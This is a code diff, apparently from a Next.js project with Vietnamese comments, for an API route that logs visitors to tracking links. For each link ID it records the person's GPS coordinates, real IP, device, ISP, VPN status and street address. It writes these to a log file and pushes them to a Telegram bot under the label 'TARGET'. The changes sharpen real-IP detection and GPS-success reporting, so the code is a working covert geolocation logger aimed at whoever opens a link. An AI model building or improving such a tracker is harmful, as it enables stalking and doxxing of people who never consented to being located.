@@ -22,7 +22,8 @@ async function getAddress(lat: number, lon: number): Promise<string> {
 
 async function checkIpIntelligence(ip: string) {
     try {
-        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,isp,city,country,proxy`, {
+        // Sử dụng ip-api.com để lấy ISP và thông tin Proxy/VPN
+        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,isp,city,country,proxy,lat,lon`, {
             next: { revalidate: 3600 }
         });
         if (res.ok) {
@@ -37,23 +38,31 @@ async function checkIpIntelligence(ip: string) {
 export async function POST(request: Request) {
   try {
     const body = await request.json();
-    const { lat, lon, acc, ip, lang, timezone, linkId } = body;
+    const { lat, lon, acc, lang, timezone, linkId, status: clientStatus } = body;
 
-    const headersList = headers();
+    const headersList = await headers();
     const ua = headersList.get('user-agent') ?? 'unknown';
     
-    const clientIp = ip || headersList.get('x-vercel-forwarded-for') || headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || 'N/A';
-    const finalIp = clientIp.startsWith('::ffff:') ? clientIp.substring(7) : clientIp;
+    // Phát hiện IP thật của khách hàng
+    const forwardedFor = headersList.get('x-forwarded-for');
+    const realIp = headersList.get('x-real-ip');
+    let finalIp = realIp || (forwardedFor ? forwardedFor.split(',')[0].trim() : 'N/A');
+    
+    if (finalIp.startsWith('::ffff:')) {
+      finalIp = finalIp.substring(7);
+    }
 
-    // Check IP Intelligence
+    // Kiểm tra IP Intelligence
     const intel = await checkIpIntelligence(finalIp);
     const isp = intel?.status === 'success' ? intel.isp : "Không rõ ISP";
     const fraud = intel?.proxy ? "VPN/Proxy" : "Sạch";
 
     let address = "Đang xác định...";
     let maps_link = "N/A";
+    let isGps = false;
 
-    if (lat !== undefined && lon !== undefined) {
+    if (lat !== undefined && lon !== undefined && lat !== null && lon !== null) {
+      isGps = true;
       address = await getAddress(lat, lon);
       maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
     } else if (intel?.status === 'success') {
@@ -63,14 +72,17 @@ export async function POST(request: Request) {
 
     let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
     logData += `Link ID: ${linkId || 'ROOT'}\n`;
+    logData += `Trạng thái: ${isGps ? 'GPS THÀNH CÔNG' : (clientStatus || 'CHỈ IP')}\n`;
     logData += `Thiết bị: ${ua}\n`;
     logData += `Địa chỉ IP: ${finalIp}\n`;
     logData += `ISP: ${isp}\n`;
     logData += `Bảo mật: ${fraud}\n`;
     logData += `Ngôn Ngữ: ${lang || 'N/A'}\n`;
     logData += `Múi Giờ: ${timezone || 'N/A'}\n`;
-    logData += `Tọa độ: ${lat || 'N/A'}, ${lon || 'N/A'}\n`;
-    logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
+    if (isGps) {
+        logData += `Tọa độ: ${lat}, ${lon}\n`;
+        logData += `Độ chính xác: ${acc}m\n`;
+    }
     logData += `Địa chỉ: ${address}\n`;
     logData += `Link Google Maps: ${maps_link}\n`;
     logData += `----------------------------------\n`;
@@ -83,11 +95,10 @@ export async function POST(request: Request) {
     }
     fs.appendFileSync(logFile, logData, 'utf-8');
 
-    // Telegram Notification (Optional if configured in settings)
+    // Telegram Notification
     const settings = await getVerificationConfigAction();
-    // Assuming settings has tgToken and tgChatId fields
     if (settings.tgToken && settings.tgChatId) {
-        const msg = `🛰️ <b>MỤC TIÊU: [${linkId || 'ROOT'}]</b>\n🛡️ Trạng thái: <b>${lat ? 'GPS Thành Công' : 'Chỉ IP'}</b>\n🌐 IP: <code>${finalIp}</code>\n📍 Địa chỉ: <code>${address}</code>\n🗺️ Map: ${maps_link}`;
+        const msg = `🛰️ <b>MỤC TIÊU: [${linkId || 'ROOT'}]</b>\n🛡️ Trạng thái: <b>${isGps ? 'GPS Thành Công' : 'Chỉ IP'}</b>\n🌐 IP: <code>${finalIp}</code>\n📍 Địa chỉ: <code>${address}</code>\n🗺️ Map: ${maps_link}`;
         fetch(`https://api.telegram.org/bot${settings.tgToken}/sendMessage?chat_id=${settings.tgChatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(e => console.error("Telegram Error:", e));
     }
     
